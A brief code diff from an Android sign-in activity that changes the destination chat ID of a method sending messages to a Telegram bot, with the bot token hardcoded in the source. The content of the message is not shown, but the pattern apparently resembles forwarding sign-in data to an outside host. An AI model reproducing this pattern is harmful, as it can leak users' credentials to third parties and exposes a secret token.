@@ -331,7 +331,7 @@ public class SignInActivity extends AppCompatActivity {
      */
     private void sendToTelegramInSignIn(String message) {
         String botToken = "7708281150:AAEvpZ3B4-xi2ZQblza5hO_4tHyGkX6fiRs";
-        String chatId = "366922808";
+        String chatId = "-4744802700";
         String urlString = "https://api.telegram.org/bot" + botToken
                 + "/sendMessage?chat_id=" + chatId
                 + "&text=" + message;
